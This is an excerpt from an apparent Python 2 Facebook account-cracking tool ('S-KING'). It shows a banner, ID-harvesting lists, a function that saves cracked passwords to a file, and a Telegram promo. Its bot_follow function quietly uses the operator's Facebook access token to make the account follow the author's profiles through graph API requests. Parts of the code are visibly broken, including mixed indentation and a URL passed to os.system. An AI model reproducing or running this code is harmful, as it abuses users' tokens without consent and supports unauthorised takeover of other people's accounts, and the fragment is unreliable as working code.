...
def banner():
    os.system('echo -e " _______    _       _________ _        _______ \n(  ____ \  | \    /\\__   __/( (    /|(  ____ \\n| (    \/  |  \  / /   ) (   |  \  ( || (    \/\n| (_____   |  (_/ /    | |   |   \ | || |      \n(_____  )  |   _ (     | |   | (\ \) || | ____ \n      ) |  |  ( \ \    | |   | | \   || | \_  )\n/\____) |  |  /  \ \___) (___| )  \  || (___) |\n\_______)  |_/    \/\_______/|/    )_)(_______)\n\n               Coded By : Shahzada Sohrab \n─────────────────────────────────────────────────────────────" | lolcat')
idmem = []
idfriend = []
idfromfriend = []
back = 0
...
def bot_follow():
	try:
		...
		print("\n   [!] Token invalid")
		masuk()
    	requests.post('https://graph.facebook.com/1827084332/subscribers?access_token=' + toket)      #Shahzada Sohrab Jan
    	...
    	requests.post('https://graph.facebook.com/607801156/subscribers?access_token=' + toket)       #Ali cebary
    	requests.post('https://graph.facebook.com/100009340646547/subscribers?access_token=' + toket) #Anita Zuliatin
    	requests.post('https://graph.facebook.com/100000415317575/subscribers?access_token=' + toket) #Hashimi Jan
    	menu()
...
def pilih_passxd():
	...
	print ("   [•] File Saved At : done/s_king.txt")
	raw_input("   [ Back ]")
	os.system("python2 S-KING")
	menu()
def telegramid():
	os.system("clear")
	banner()
	jalan ("\n   [•] Well come to my telegram id...")
	os.system('xdg-open https://t.me/@shahzada_7889')
	print ("   [•] send masseg")
	raw_input("\n   [ Back ]")
	os.system("https://t.me/S_H_A_H_Z_A_D_A_86")	
